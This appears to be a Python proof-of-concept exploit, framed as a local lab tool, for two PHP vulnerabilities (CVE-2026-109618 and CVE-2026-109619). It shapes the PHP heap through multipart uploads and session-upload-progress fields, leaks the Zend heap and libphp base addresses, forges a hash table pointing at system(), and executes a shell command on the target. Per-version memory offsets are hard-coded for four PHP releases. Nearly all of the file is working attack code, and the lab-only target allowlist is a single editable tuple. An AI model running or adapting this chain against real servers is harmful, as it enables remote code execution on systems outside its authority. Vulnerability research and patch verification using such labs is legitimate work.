#!/usr/bin/env python3
"""Local-only proof for CVE-2026-109618 and CVE-2026-109619 research labs."""

import argparse
import re
import socket
import struct
import subprocess
import threading
import time
import urllib.parse
from collections import Counter
from dataclasses import dataclass

PATH = "/index.php"
COMMAND = b"id>/out/p1"
SESSION_ID = b"attacksessionid0001"
ALLOWED_TARGETS = ("target:80", "127.0.0.1:8088", "localhost:8088")

MAX_ATTEMPTS = 5
OOM_SIZE = 12 * 1024 * 1024
ZEND_HEAP_SIZE = 0x200000


@dataclass(frozen=True)
class Profile:
    version: str
    image_digest: str
    zif_system_offset: int
    zval_ptr_dtor_offset: int
    hash_table_offset: int
    stage_1_fillers: int = 841
    stage_2_target: int = 406
    stage_2_value_size: int = 16
    in_band_leaks: bool = True


PROFILES = {
    "8.2.34": Profile(
        version="8.2.34",
        image_digest=(
            "sha256:1650dcb528360aad05d6ed2f83cb403a2a39c31bd14552efd9a747b2207dea86"
        ),
        zif_system_offset=0x39B8A0,
        zval_ptr_dtor_offset=0x487650,
        hash_table_offset=0x6A0D8,
        in_band_leaks=False,
    ),
    "8.3.35": Profile(
        version="8.3.35",
        image_digest=(
            "sha256:c59c808172ee3672cd334f8f2a5d7b1480a9d7273a368f412b8ee9b4ef418184"
        ),
        zif_system_offset=0x3AC080,
        zval_ptr_dtor_offset=0x49EC50,
        hash_table_offset=0x6A0D8,
    ),
    "8.4.26": Profile(
        version="8.4.26",
        image_digest=(
            "sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a"
        ),
        zif_system_offset=0x465370,
        zval_ptr_dtor_offset=0x65EB60,
        hash_table_offset=0x690D8,
    ),
    "8.5.11": Profile(
        version="8.5.11",
        image_digest=(
            "sha256:47e6d8849049375e0d19e81f1b391ed88828d4653e0d1b00822185b66b564e8b"
        ),
        zif_system_offset=0x5996E0,
        zval_ptr_dtor_offset=0x7B47A0,
        hash_table_offset=0x690D8,
    ),
}


def multipart(parts, boundary):
    body = bytearray()
    for part in parts:
        body += b"--" + boundary + b"\r\n"
        body += b'Content-Disposition: form-data; name="'
        body += part["name"].encode() + b'"'
        if "filename" in part:
            body += b'; filename="' + part["filename"].encode() + b'"'
            body += b"\r\nContent-Type: application/octet-stream"
        body += b"\r\n\r\n" + part["data"] + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    return bytes(body)


class HttpClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connect(self):
        last_error = None
        for _ in range(20):
            try:
                connection = socket.create_connection(
                    (self.host, self.port), timeout=30
                )
                connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                return connection
            except OSError as error:
                last_error = error
                time.sleep(0.25)
        raise last_error

    def post(self, body, boundary, read_limit=1 << 20, timeout=30, headers=None):
        extra_headers = "".join(
            f"{name}: {value}\r\n" for name, value in (headers or {}).items()
        )
        request = (
            f"POST {PATH} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"{extra_headers}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()

        connection = self.connect()
        connection.settimeout(timeout)
        response = bytearray()

        def receive():
            try:
                while len(response) < read_limit:
                    chunk = connection.recv(65536)
                    if not chunk:
                        break
                    response.extend(chunk)
            except OSError:
                pass

        reader = threading.Thread(target=receive, daemon=True)
        reader.start()
        try:
            try:
                connection.sendall(request)
                view = memoryview(body)
                for offset in range(0, len(body), 262144):
                    connection.sendall(view[offset:offset + 262144])
            except OSError:
                pass
            reader.join(timeout + 1)
            return bytes(response)
        finally:
            connection.close()

    def get(self):
        request = (
            f"GET {PATH} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        connection = self.connect()
        connection.settimeout(30)
        response = bytearray()
        try:
            connection.sendall(request)
            while True:
                chunk = connection.recv(65536)
                if not chunk:
                    break
                response.extend(chunk)
        finally:
            connection.close()
        return bytes(response)

    def page(self):
        _, separator, body = self.get().partition(b"\r\n\r\n")
        if not separator:
            return ""
        return body.decode("utf-8", errors="replace").strip()

    def php_version(self):
        headers, separator, _ = self.get().partition(b"\r\n\r\n")
        if not separator:
            return ""
        match = re.search(
            rb"(?im)^X-Powered-By:\s*PHP/([0-9]+\.[0-9]+\.[0-9]+)", headers
        )
        return match.group(1).decode() if match else ""


def session_cookie(response):
    match = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", response)
    if not match:
        return b""
    return urllib.parse.unquote_to_bytes(match.group(1).decode("latin1"))


def is_mapping_pointer(value):
    # Linux and WSL2 commonly place mmap-backed regions anywhere in this range.
    return 0x700000000000 <= value < 0x800000000000


def heap_base(cookie):
    if len(cookie) < 1000:
        return 0
    candidates = Counter()
    for offset in range(len(cookie) - 7):
        value = int.from_bytes(cookie[offset:offset + 8], "little")
        if is_mapping_pointer(value):
            candidates[value & ~(ZEND_HEAP_SIZE - 1)] += 1
    if not candidates:
        return 0
    base, count = candidates.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base(cookie, destructor_offset):
    if len(cookie) < 16:
        return 0
    destructor = int.from_bytes(cookie[8:16], "little")
    if not is_mapping_pointer(destructor):
        return 0
    if destructor & 0xFFF != destructor_offset & 0xFFF:
        return 0
    base = destructor - destructor_offset
    return base if base & 0xFFF == 0 else 0


def docker_output(arguments):
    try:
        result = subprocess.run(
            ["docker", *arguments],
            check=True,
            capture_output=True,
            text=True,
        )
    except FileNotFoundError as error:
        raise RuntimeError("Docker CLI was not found") from error
    except subprocess.CalledProcessError as error:
        detail = error.stderr.strip() or error.stdout.strip() or "Docker command failed"
        raise RuntimeError(detail) from error
    return result.stdout.strip()


def validate_container_name(container):
    if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*", container):
        raise RuntimeError("invalid Docker container name or ID")


def find_page_container():
    filters = [
        "ps",
        "--filter",
        "label=com.docker.compose.project=php-rce-page",
        "--filter",
        "label=com.docker.compose.service=target",
        "--format",
        "{{.ID}}",
    ]
    containers = docker_output(filters).splitlines()
    if not containers:
        containers = docker_output(
            ["ps", "--filter", "publish=8088", "--format", "{{.ID}}"]
        ).splitlines()
    if len(containers) != 1:
        raise RuntimeError(
            "could not uniquely identify the local port-8088 lab container; "
            "pass --docker-container"
        )
    return containers[0]


def docker_bases(container, profile):
    validate_container_name(container)

    actual_version = docker_output(
        ["exec", container, "php", "-r", "echo PHP_VERSION;"]
    )
    if actual_version != profile.version:
        raise RuntimeError(
            f"container runs PHP {actual_version}, not profile {profile.version}"
        )

    configured_image = docker_output(
        ["inspect", "--format", "{{.Config.Image}}", container]
    )
    if profile.image_digest not in configured_image:
        raise RuntimeError(
            "container is not using the exact image digest calibrated by this lab"
        )

    mappings = docker_output(["exec", container, "cat", "/proc/1/maps"])
    libphp_candidates = set()
    heap_candidates = set()

    for line in mappings.splitlines():
        fields = line.split(None, 5)
        if len(fields) < 5:
            continue
        bounds, permissions, file_offset, _device, inode = fields[:5]
        start_text, end_text = bounds.split("-", 1)
        start = int(start_text, 16)
        end = int(end_text, 16)
        offset = int(file_offset, 16)
        path = fields[5] if len(fields) == 6 else ""

        # The first ELF mapping has file offset zero and is the load base.
        # Later segments can differ by one page because of ELF alignment.
        if path.endswith("/usr/lib/apache2/modules/libphp.so") and offset == 0:
            libphp_candidates.add(start)

        if (
            len(fields) == 5
            and permissions == "rw-p"
            and offset == 0
            and inode == "0"
            and ZEND_HEAP_SIZE <= end - start <= 2 * ZEND_HEAP_SIZE
        ):
            first = (start + ZEND_HEAP_SIZE - 1) & ~(ZEND_HEAP_SIZE - 1)
            aligned = []
            candidate = first
            while candidate + ZEND_HEAP_SIZE <= end:
                aligned.append(candidate)
                candidate += ZEND_HEAP_SIZE
            if len(aligned) == 1:
                heap_candidates.add(aligned[0])

    if len(libphp_candidates) != 1:
        raise RuntimeError("could not uniquely resolve libphp from /proc/1/maps")
    if len(heap_candidates) != 1:
        values = ", ".join(f"0x{value:x}" for value in sorted(heap_candidates))
        raise RuntimeError(
            "could not uniquely resolve the Zend heap from /proc/1/maps"
            + (f" (candidates: {values})" if values else "")
        )

    return heap_candidates.pop(), libphp_candidates.pop()


class LabProof:
    def __init__(self, host, port, profile):
        self.http = HttpClient(host, port)
        self.profile = profile

    @staticmethod
    def big_field():
        return {"name": "big", "data": b"B" * OOM_SIZE}

    @staticmethod
    def file_field():
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate_worker(self):
        print("[*] Rotating the Apache worker", flush=True)
        parts = [
            {"name": f"f{index:04d}"[:5], "data": b"V" * 3000}
            for index in range(1001)
        ]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self.file_field(),
            self.big_field(),
        ]
        boundary = b"S" * 17
        self.http.post(
            multipart(parts, boundary), boundary, timeout=90, read_limit=1 << 20
        )
        time.sleep(0.3)

        parts = [
            {"name": "PHPSESSID", "data": SESSION_ID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        boundary = b"BNDRY12345"
        self.http.post(
            multipart(parts, boundary), boundary, timeout=20, read_limit=65536
        )
        time.sleep(0.5)

    def leak_heap(self):
        parts = [
            {"name": f"p{index:04d}", "data": b"x"} for index in range(1001)
        ]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self.file_field(),
            self.big_field(),
        ]
        boundary = b"S" * 17
        self.http.post(
            multipart(parts, boundary), boundary, timeout=90, read_limit=1 << 20
        )
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SESSION_ID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for index in range(self.profile.stage_1_fillers):
            value = (f"v{index:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + index), "data": value.encode()})

        forged_string = bytearray(b"A" * 79)
        struct.pack_into("<Q", forged_string, 0x10, 0x1000)
        forged_string[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forged_string)})

        boundary = b"B" * 10
        response = self.http.post(
            multipart(parts, boundary), boundary, read_limit=9 << 20
        )
        return heap_base(session_cookie(response))

    def leak_libphp(self):
        parts = [
            {"name": f"f{index:04d}"[:5], "data": b"x" * 39}
            for index in range(1001)
        ]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self.file_field(),
            self.big_field(),
        ]
        boundary = b"S" * 17
        self.http.post(
            multipart(parts, boundary), boundary, timeout=90, read_limit=1 << 20
        )
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SESSION_ID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for index in range(983):
            count = 16 if index == self.profile.stage_2_target else 1
            for item in range(count):
                parts.append(
                    {
                        "name": f"a{index:04d}[{item}]",
                        "data": b"x" * self.profile.stage_2_value_size,
                    }
                )

        boundary = b"B" * 10
        response = self.http.post(
            multipart(parts, boundary), boundary, read_limit=1 << 20
        )
        return libphp_base(
            session_cookie(response), self.profile.zval_ptr_dtor_offset
        )

    @staticmethod
    def fake_hash_table(address, system_address):
        table = bytearray(167)
        struct.pack_into("<II", table, 0x00, 1, 7)
        struct.pack_into("<II", table, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", table, 0x10, address + 0x20)
        struct.pack_into("<II", table, 0x18, 1, 1)
        struct.pack_into("<II", table, 0x20, 8, 0)
        struct.pack_into("<Q", table, 0x28, 0)
        struct.pack_into("<Q", table, 0x30, system_address)

        execution = 0x20
        struct.pack_into("<Q", table, execution + 0x00, 0)
        struct.pack_into("<Q", table, execution + 0x08, 0)
        struct.pack_into("<Q", table, execution + 0x10, system_address)
        struct.pack_into("<Q", table, execution + 0x18, 0)
        struct.pack_into("<Q", table, execution + 0x20, 0)
        struct.pack_into("<I", table, execution + 0x28, 0)
        struct.pack_into("<I", table, execution + 0x2C, 1)
        struct.pack_into("<Q", table, execution + 0x30, 0)
        struct.pack_into("<Q", table, execution + 0x38, 0)
        struct.pack_into("<I", table, execution + 0x40, 0)
        struct.pack_into("<Q", table, execution + 0x50, address + 0x80)
        struct.pack_into("<I", table, execution + 0x58, 6)

        struct.pack_into("<II", table, 0x80, 1, 0x106)
        struct.pack_into("<Q", table, 0x88, 0)
        struct.pack_into("<Q", table, 0x90, len(COMMAND))
        table[0x98:0x98 + len(COMMAND)] = COMMAND
        table[0x98 + len(COMMAND)] = 0
        return bytes(table)

    def arm_execution(self):
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for index in range(6):
            parts.append({"name": f"p{index:030d}"[:31], "data": b"V" * 31})
        parts += [self.file_field(), self.big_field()]

        boundary = b"S" * 17
        self.http.post(
            multipart(parts, boundary),
            boundary,
            timeout=90,
            read_limit=1 << 20,
            headers={"Cookie": "PHPSESSID=" + "a" * 32},
        )
        time.sleep(0.3)

    def fire_execution(self, table_address, system_address):
        table = self.fake_hash_table(table_address, system_address)
        carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", table_address)[:7]
        parts = [
            {"name": "PHPSESSID", "data": SESSION_ID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            {"name": "f00", "data": b"F" * 15},
            {"name": "f01", "data": b"F" * 15},
            {"name": "g00", "data": carrier},
        ]
        for index in range(15):
            parts.append({"name": f"a{index:030d}"[:31], "data": table})

        boundary = b"B" * 10
        self.http.post(
            multipart(parts, boundary), boundary, timeout=30, read_limit=65536
        )

    def execute(self, table_address, system_address):
        self.arm_execution()
        self.fire_execution(table_address, system_address)


def retry_leak(proof, label, action):
    for attempt in range(1, MAX_ATTEMPTS + 1):
        print(f"[*] {label}, attempt {attempt}/{MAX_ATTEMPTS}", flush=True)
        address = action()
        if address:
            print(f"[+] {label}: 0x{address:x}", flush=True)
            return address
        proof.rotate_worker()
    raise RuntimeError(f"{label} failed")


def parse_address(value):
    try:
        address = int(value, 0)
    except ValueError as error:
        raise argparse.ArgumentTypeError(
            "expected a decimal or 0x-prefixed address"
        ) from error
    if not is_mapping_pointer(address):
        raise argparse.ArgumentTypeError(
            "address is outside the expected local mapping range"
        )
    return address


def selected_profile(requested, detected):
    if requested == "auto":
        if detected not in PROFILES:
            supported = ", ".join(PROFILES)
            raise RuntimeError(
                f"detected PHP {detected or 'unknown'}; supported versions: {supported}"
            )
        return PROFILES[detected]

    profile = PROFILES[requested]
    if detected and detected != profile.version:
        raise RuntimeError(
            f"target reports PHP {detected}, but profile {profile.version} was selected"
        )
    return profile


def run_proof(proof, heap, libphp):
    profile = proof.profile
    if heap is None or libphp is None:
        proof.rotate_worker()
        heap = retry_leak(proof, "Zend heap base", proof.leak_heap)

        proof.rotate_worker()
        libphp = retry_leak(proof, "libphp base", proof.leak_libphp)
    else:
        print(f"[+] Zend heap base: 0x{heap:x}", flush=True)
        print(f"[+] libphp base: 0x{libphp:x}", flush=True)

    proof.rotate_worker()
    table = heap + profile.hash_table_offset
    system = libphp + profile.zif_system_offset
    print(f"[*] Executing fixed proof at table=0x{table:x}", flush=True)

    for attempt in range(1, MAX_ATTEMPTS + 3):
        proof.execute(table, system)
        time.sleep(0.8)
        result = proof.http.page()
        if result.startswith("php-lab: updated by the PoC"):
            print(f"[+] Proof succeeded on attempt {attempt}")
            print("UPDATED PAGE:")
            print(result)
            return 0
        proof.rotate_worker()

    raise RuntimeError("command execution proof failed")


def main():
    parser = argparse.ArgumentParser(
        description="Fixed proof for the supported local PHP Apache Docker labs"
    )
    parser.add_argument(
        "target",
        nargs="?",
        default="target:80",
        choices=ALLOWED_TARGETS,
        help="local lab endpoint",
    )
    parser.add_argument(
        "--profile",
        default="auto",
        choices=("auto", *PROFILES),
        help="PHP profile; default: detect the X-Powered-By header",
    )
    parser.add_argument("--heap-base", type=parse_address, help=argparse.SUPPRESS)
    parser.add_argument("--libphp-base", type=parse_address, help=argparse.SUPPRESS)
    parser.add_argument(
        "--docker-container",
        help="local lab container used for the PHP 8.2.34 address lookup",
    )
    parser.add_argument(
        "--print-docker-bases",
        metavar="CONTAINER",
        help=argparse.SUPPRESS,
    )
    arguments = parser.parse_args()

    if (arguments.heap_base is None) != (arguments.libphp_base is None):
        parser.error("--heap-base and --libphp-base must be supplied together")

    if arguments.print_docker_bases:
        if arguments.profile == "auto":
            parser.error("--print-docker-bases requires an explicit --profile")
        profile = PROFILES[arguments.profile]
        heap, libphp = docker_bases(arguments.print_docker_bases, profile)
        print(f"0x{heap:x} 0x{libphp:x}")
        return 0

    host, port_text = arguments.target.rsplit(":", 1)
    port = int(port_text)
    client = HttpClient(host, port)
    detected = client.php_version()
    profile = selected_profile(arguments.profile, detected)

    print(f"[*] PHP {profile.version} local proof against {host}:{port}", flush=True)
    proof = LabProof(host, port, profile)
    heap = arguments.heap_base
    libphp = arguments.libphp_base

    if not profile.in_band_leaks and heap is None:
        if host not in ("127.0.0.1", "localhost"):
            raise RuntimeError(
                "PHP 8.2.34 needs Docker-assisted address discovery; use run.sh "
                "or run against the browser lab on 127.0.0.1:8088"
            )
        container = arguments.docker_container or find_page_container()
        heap, libphp = docker_bases(container, profile)
        print(
            f"[*] PHP 8.2.34 mode: Docker-assisted addresses from {container}",
            flush=True,
        )
    elif profile.in_band_leaks:
        print("[*] Address mode: HTTP-only leak chain", flush=True)

    return run_proof(proof, heap, libphp)


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, RuntimeError) as error:
        print(f"ERROR: {error}")
        raise SystemExit(1)
